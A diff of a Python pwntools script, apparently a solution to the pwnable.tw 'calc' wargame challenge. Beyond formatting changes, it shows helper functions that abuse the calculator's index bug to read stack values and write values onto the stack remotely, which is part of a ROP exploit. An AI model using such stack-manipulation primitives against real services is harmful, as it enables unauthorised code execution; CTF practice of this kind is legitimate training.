@@ -1,11 +1,10 @@
 from pwn import *
 
-context(arch='i386', os='linux', endian='little', word_size=32)
 server = remote('chall.pwnable.tw', 10100)
 
 def read_stack_val(offset):
     #get current value on stack
-    server.sendline('+'+str(offset))
+    server.sendline('+' + str(offset))
     current_val = int(server.read()[0:-1])
     return current_val
 
@@ -15,14 +14,12 @@ def push_on_stack(value):
     
     if(val_to_add > 0):
         #add the difference between addr and current location
-        payload = '+'+str(push_on_stack.counter)+'-'+str(val_to_add)+'\n' 
+        payload = '+' + str(push_on_stack.counter) + '-' + str(val_to_add) + '\n' 
     else:
         #adding to current addr bytes needed to reach gadget addr
-        payload = '+'+str(push_on_stack.counter)+'+'+str((-1)*val_to_add)+'\n' 
+        payload = '+' + str(push_on_stack.counter) + '+' + str(-1*val_to_add) + '\n' 
     server.send(payload)
-    recv = server.read()
-    ret_addr_calc = int(recv[0:-1])
-    print('Commencing hacking...')
+    ret_addr_calc = int(server.read()[0:-1])
     push_on_stack.counter += 1
     
 push_on_stack.counter = 361
